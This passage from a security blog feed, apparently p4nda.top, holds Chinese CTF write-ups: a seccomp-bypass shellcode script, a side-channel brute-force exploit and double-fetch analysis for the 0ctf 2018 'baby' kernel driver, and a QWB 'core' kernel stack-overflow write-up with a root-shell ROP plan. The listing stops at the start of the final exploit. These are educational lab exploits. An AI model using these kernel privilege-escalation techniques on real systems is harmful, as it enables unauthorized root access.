endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./vul"</span>)</span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="string">"input:"</span>,<span class="number">0x6</span>)</span><br><span class="line">shellcode+= shellcraft.read(<span class="number">0</span>,<span class="number">0x601200</span>,<span class="number">0x20</span>)</span><br><span class="line">shellcode+= <span class="string">'''    mov edi, 0x1010101 /* 6296064 == 0x601200 */</span></span><br><span class="line"><span class="string">    xor edi, 0x1611301</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call open() */</span></span><br><span class="line"><span class="string">    push 0x40000002 /* 2 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall\n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode+= shellcraft.read(<span class="number">3</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.recvuntil(<span class="string">'input:'</span>)</span><br><span class="line">p.send(<span class="string">'./flag\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/ciscn-final/1-2.png" alt=""></p><p>参考：</p><p><a href="https://sites.google.com/site/x32abi/" target="_blank" rel="noopener">https://sites.google.com/site/x32abi/</a></p><p><a href="https://blog.csdn.net/qq_29343201/article/details/72627528" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/72627528</a></p><p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools</a></p><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p>最后附上PPT</p><p><img src="/img/ciscn-final/ppt1.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt2.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt3.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt4.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      一些参加全国大学生信息安全竞赛决赛的记录，本来想多吐槽一些的，后来想想算了，别留那么多负能量，不过最后这个颁奖环节我真的忍不了了... 
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>【kernel pwn】0ctf 2018 final baby题解</title>
    <link href="http://p4nda.top/2018/07/20/0ctf-baby/"/>
    <id>http://p4nda.top/2018/07/20/0ctf-baby/</id>
    <published>2018-07-20T10:39:12.000Z</published>
    <updated>2018-07-23T05:43:52.765Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1s_lqbRZdPsAcp2qm52A-kw" target="_blank" rel="noopener">题目及相关下载</a> 密码:<strong><em>fant</em></strong></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目代码很简单，仅注册了ioctl函数，里面包含了两个case，在参数为0x6666时，可以泄露出bss段flag的地址。</p><p>在参数为0x1337时，用户输入是一个结构体，而传入驱动的是一个指针。</p><p>这个结构体应该是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *flag;</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对这个结构体指针进行一系列判断以后，会比较结构体中的flag指针指向的内容和长度，当比较的用户输入长度和内容都是flag时，使用printk打印flag内容。</p><p><img src="/img/0ctf-babyko/1-1.png" alt=""></p><p>仔细查看一下_chk_range_not_ok，看类C代码看不出什么意思，查看一下汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 __chk_range_not_ok proc near            ; CODE XREF: baby_ioctl+7B↓p</span><br><span class="line">.text:0000000000000000                                         ; baby_ioctl+BD↓p</span><br><span class="line">.text:0000000000000000                 push    rbp</span><br><span class="line">.text:0000000000000001                 add     rdi, rsi</span><br><span class="line">.text:0000000000000004                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000007                 jb      short loc_11</span><br><span class="line">.text:0000000000000009                 cmp     rdx, rdi</span><br><span class="line">.text:000000000000000C                 setb    al</span><br><span class="line">.text:000000000000000F                 pop     rbp</span><br><span class="line">.text:0000000000000010                 retn</span><br><span class="line">.text:0000000000000011 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000011</span><br><span class="line">.text:0000000000000011 loc_11:                                 ; CODE XREF: __chk_range_not_ok+7↑j</span><br><span class="line">.text:0000000000000011                 mov     eax, 1</span><br><span class="line">.text:0000000000000016                 pop     rbp</span><br><span class="line">.text:0000000000000017                 retn</span><br><span class="line">.text:0000000000000017 __chk_range_not_ok endp</span><br></pre></td></tr></table></figure><p>可以看出，是将第一个参数和第二个参数相加，判断是否小于第三个参数，如果不小于将al置为1。</p><p>在动态调试的时候，发现第三个参数是一个常量： 0x7ffffffff000</p><p>这样的话，题目就很清楚了。判断的限制是传入的结构体+16，也就是整个结构体要在用户态中，并且结构体中第一个成员所指向的内存也要在用户态中。并且第二个参数要和bss段上的flag长度相等。这样会逐字节比较输入的flag是否等于bss保存的flag。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>和libc的pwn题不太一样，内核驱动的pwn需要驱动在一个版本的内核代码下编译，否则无法运行。</p><p><img src="/img/0ctf-babyko/2-1.png" alt=""></p><p>在程序代码中可以看到一个内核版本号——4.15.0-22-generic SMP mod_unload，我从官网源代码下载的版本只有4.15.0而没有-22的小版本。</p><p>此时，可以通过下载相应的内核deb包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-4.15.0-22-generic</span><br></pre></td></tr></table></figure><p>下载得到的linux-image-4.15.0-22-generic_4.15.0-22.24~16.04.1_amd64.deb中data.tar.xz下的boot中可以找到一个叫vmlinuz-4.15.0-22-generic的文件，这就是需要的内核映像。</p><p>此处需要明确文件的区别        <strong><em>//一定是我太菜才不知道</em></strong></p><p>vmlinux：这个是编译出来原始的内核，未经过压缩，<strong>不能直接通过qemu启动</strong>，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。</p><p>bzImage：这个是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。</p><p>*.cpio：这个东西一般都是打包生成的，最开始是从busybox中导出来的，类似于启动的文件系统吧（？）一般kernel pwn会在这里放*.ko。甚至放vmlinux…</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>环境搭建起来了，就可以看一下漏洞如何利用了。比赛中出现了两种解题方法，一种是预期解，另外一种是侧信道攻击。</p><h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>所谓侧信道攻击就是用能标明flag内容的方法，通过其他表现形式把flag爆破出来。</p><p>在程序中存在一个问题，就是在比较之前没有判断用户输入的flag段是否可读的，当输入的flag处于不可读段的时候，在比较时会触发段错误，从而造成kernel panic，利用这种现象可以用一下方法每次爆破一个字节的flag。</p><p>方法原理如下，利用mmap新建3个段，第一个、第三个权限设为000，第二可读写，并且每次将已有的flag防止在第二个段的最后，每次最后一个字节时爆破的字节，当这个字节和flag不符合时，内核驱动会退出，因此不触发错误。而当最后一个字节正确时，程序比较会下移一个字节，触发错误，引起kernel panic，从而可以判断出单字节的flag，原理如下：</p><p><img src="/img/0ctf-babyko/2-3.png" alt=""></p><p>这样测试33次就可以得到flag了。</p><p><img src="/img/0ctf-babyko/2-2.png" alt=""></p><p>EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// start.c </span></span><br><span class="line"><span class="comment">// for start pwn.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *ch = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%%&amp;\\'()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~"</span>;</span><br><span class="line"><span class="keyword">char</span> input[<span class="number">34</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> order[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">char</span> order2[<span class="number">0x100</span>];</span><br><span class="line">FILE * fd = fopen(<span class="string">"save.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fd,<span class="string">"%s"</span>,input);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;<span class="built_in">strlen</span>(ch);i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (ch[i] == <span class="string">'\"'</span> ||  ch[i] == <span class="string">'\\'</span> || ch[i] == <span class="string">'`'</span> )&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s\\%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line"><span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s\\%c"</span>,input,ch[i] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line"><span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s%c"</span>,input,ch[i] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,order2);</span><br><span class="line">system(order);</span><br><span class="line">system(order2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//strcpy(order,"echo \"");</span></span><br><span class="line"><span class="comment">//strcpy</span></span><br><span class="line"><span class="comment">//system("")</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">// pwn.c</span></span><br><span class="line"><span class="comment">// test per round</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *flag;</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i , fd;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> <span class="title">input</span> ;</span>  </span><br><span class="line"><span class="keyword">if</span> (argc!=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"argc error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input : %s len: %d \n"</span>,argv[<span class="number">1</span>],<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">buf = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(buf&gt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; get a memeroy: %p\n"</span>,buf);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;<span class="built_in">strlen</span>(argv[<span class="number">1</span>]);i++)&#123;</span><br><span class="line">buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i] = argv[<span class="number">1</span>][i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; addr: %p content: %c \n"</span>, &amp;buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i], argv[<span class="number">1</span>][i] );</span><br><span class="line">&#125;</span><br><span class="line">fd = open(<span class="string">"/dev/baby"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cannot open /dev/baby\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; fd of /dev/baby: %d\n"</span>,fd);</span><br><span class="line">((struct _input * )buf)-&gt;len = <span class="number">33</span>;</span><br><span class="line">((struct _input * )buf)-&gt;flag = (buf+<span class="number">0x1000</span>-<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input: %p\n"</span>,input.flag);</span><br><span class="line">ioctl(fd,<span class="number">0x1337</span>,buf);</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解的漏洞叫做double fetch漏洞，应该算是一种竞争条件漏洞</p><p><strong>Serna[ Serna, F. J. MS08-61:thecaseofthekernelmodedoublefetch,2008.<a href="https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/</a>.]</strong></p><p><strong><em>用户通常会通过调用内核函数完成特定功能，当内核函数两次从同一用户内存地址读取同一数据时，通常第一次读取用来验证数据或建立联系，第二次则用来使用该数据。与此同时，用户空间并发运行的恶意线程可以在两次内核读取操作之间，利用竞争条件对该数据进行篡改，从而造成内核使用数据的不一致。Double fetch漏洞可造成包括缓冲区溢出、信息泄露、空指针引用等后果，最终造成内核崩溃或者恶意提权。</em></strong></p><p>也就是说，参数是从用户态传进来的，当用户态对传入的结构体改变时，内核读到的数据也会被改变。</p><p>因此，在用户态新建一个线程不断的修改传入的结构体中flag指针为内核flag的值。当驱动运行时，恰好通过地址验证后，在数据判断之前内核数据flag地址被改掉的话，则可以做到通过内容验证，从而打印出flag内容。</p><p>printk输出的内容可以用dmesg来查看。</p><p>此处有个坑点，是QEMU默认启动时会使用当个core、单个thread，这样内核相当于是单进程的。</p><p>而单进程的内核很难触发这个漏洞，因此需要在QEMU启动时设置好内核和进程数如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br></pre></td></tr></table></figure><p>这个问题坑了我好久，此处非常感谢<a href="https://veritas501.space/" target="_blank" rel="noopener">Veritas501师傅</a>。</p><p>具体EXP，<a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">Veritas501师傅的文章</a>写的很好了，我没有什么创新点就不写了。</p><p><img src="/img/0ctf-babyko/0.png" alt=""></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/" target="_blank" rel="noopener">https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</a></p><p><a href="https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html" target="_blank" rel="noopener">https://www.secspace.com/view-ff3bbe863b544a929f96110e7b8992c8-e5cf621eacdb49b3b35b71a20e0ce9be.html</a></p>]]></content>
    
    <summary type="html">
    
      这个比赛也过去好久了，比赛的时候没有去线下赛，只能赛后复现一下。拿这道题来作为入门的第二道KERNEL PWN吧...
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
  </entry>
  
  <entry>
    <title>【kernel pwn】强网杯CTF2018 core题解</title>
    <link href="http://p4nda.top/2018/07/13/ciscn2018-core/"/>
    <id>http://p4nda.top/2018/07/13/ciscn2018-core/</id>
    <published>2018-07-13T02:01:41.000Z</published>
    <updated>2018-10-03T12:46:49.760Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1AIG5vXKOMFIYSGmEdiJNRA" target="_blank" rel="noopener">题目及相关文件下载</a>，密码：914k</p><p>这是一道接近于libc的overflowme的题目了，调试还是比较麻烦，如果大佬们有好用的kernel用gdb插件麻烦告知我一下，环境好容易崩溃啊…</p><h1 id="core"><a href="#core" class="headerlink" title="core"></a>core</h1><h2 id="题目-amp-漏洞分析"><a href="#题目-amp-漏洞分析" class="headerlink" title="题目&amp;漏洞分析"></a>题目&amp;漏洞分析</h2><p>题目中注册了core_write、core_ioctl，而在core_ioctl中会根据参数去调用core_read、core_copy_func函数。</p><p>core_write: 用户可以向全局变量中写入一个不大于0x800的字符串内容</p><p><img src="/img/QWB_core/1-1.png" alt=""></p><p>core_ioctl：分为3个case，维护了一个全局变量，当参数为0x6677889c的时候，可以设置这个变量，其余情况会分别调用core_read、core_copy_func函数</p><p><img src="/img/QWB_core/1-2.png" alt=""></p><p>core_read：会根据core_ioctl维护的全局变量，从栈上读出长度为0x40的数据，这里很显然可以越界读数据，栈上的返回地址、canary之类的都可以读到</p><p><img src="/img/QWB_core/1-3.png" alt=""></p><p>core_copy_func：会根据用户的输入长度，从name这个全局变量中向栈上读出数据。在判断时这个变量的类型是signed long long，而读出的时候变成了signed short，显然存在一个截断，当使用如0xf000000000000300这样的数据就可以绕过限制，造成内核的栈溢出。可以说是为了出题而出题了…</p><p><img src="/img/QWB_core/1-4.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先检查一下内核的安全保护机制，通过查看start.sh发现没有开启smep，开启了kalsr和canary的。所谓smep是内核为了避免ret2user的利用方法增加的一种保护方法，即内核代码不能跳转到用户空间去执行代码，绕过方法也很简单，使用内核的ROP就可以了，但此题由于没有这个保护，可以直接使用ret2user的攻击方法。</p><p>题目给出的目录结构是这样的：</p><p>core.cpio：这是一个打包的文件，解包以后发现里面有文件系统，其中以vmlinux命名的是内核的二进制文件，core.ko是存在漏洞的驱动，也就是题目分析中分析的二进制文件。</p><p>start.sh： 启动脚本，标明启动的方法、保护措施等</p><p>bzImage：镜像文件</p><p>这里类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的。</p><h3 id="内存地址泄露"><a href="#内存地址泄露" class="headerlink" title="内存地址泄露"></a>内存地址泄露</h3><p>这个漏洞在分析中已经说过了，在ioctl中设置全局变量的值，然后利用core_read函数可以泄露栈上的数据：</p><p>首先先对core驱动下断点，断点的下法是，首先在qemu中查看/sys/module/core/sections/.text文件，找到镜像加载的基地址：</p><p><img src="/img/QWB_core/2-1.png" alt=""></p><p>然后在gdb端，执行<strong><em>add-symbol-file ./core/core.ko 0xffffffffc03a0000</em></strong> ，为驱动增加符号表</p><p><img src="/img/QWB_core/2-2.png" alt=""></p><p>这样就可以下断点了，首先看一下再core_read的栈内容。</p><p><img src="/img/QWB_core/2-3.png" alt=""></p><p>由于kernel pwn 的最终目的是提权到root，一种简单的方法是执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>而commit_creds、prapare_kernel_cred都是内核函数，在vmlinux中，因此还需要泄露vmlinux的基地址。</p><p>而在栈地址中并不能看出来哪个地址属于vmlinux，这里用一个应该算是复杂的方法吧。</p><p>首先找到这两个函数在vmlinux的偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./core/vmlinux'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"commit_creds"</span>,hex(elf.symbols[<span class="string">'commit_creds'</span>]<span class="number">-0xffffffff81000000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"prepare_kernel_cred"</span>,hex(elf.symbols[<span class="string">'prepare_kernel_cred'</span>]<span class="number">-0xffffffff81000000</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/QWB_core/2-4.png" alt=""></p><p>在qemu里查看/proc/kallsyms中的 commit_creds 函数地址</p><p><img src="/img/QWB_core/2-5.png" alt=""></p><p>而计算之后，找到vmlinux的基址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Nov <span class="number">20</span> <span class="number">2017</span>, <span class="number">18</span>:<span class="number">23</span>:<span class="number">56</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0xffffffffba89c8e0</span><span class="number">-0x9c8e0</span>)</span><br><span class="line"><span class="string">'0xffffffffba800000L'</span></span><br></pre></td></tr></table></figure><p>可以发现在栈上有一条数据在vmlinux不远处，距离为0x9dd6d1</p><h3 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h3><p>能够泄露vmlinux、驱动和canary了以后，就变得比较容易了。</p><p>首先预先构造好ROP，使用core_write写入到全局变量name中备用。</p><p>执行<strong><em>ROPgadget –binary vmlinux &gt; 1.txt</em></strong>保存gadget备用，这个过程慢到令人发指…</p><p>而在core_copy_func中，构造长度为0xf000000000000300，即可成功覆盖RIP</p><h3 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h3><p>其实，提取过程很容易，流程是：</p><p>1 <strong><em>执行 commit_creds(prepare_kernel_cred(0))</em></strong>，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址；</p><p>2 <strong><em>执行swapgs</em></strong>，准备回到用户态</p><p>3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。</p><p><img src="/img/QWB_core/0.png" alt=""></p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 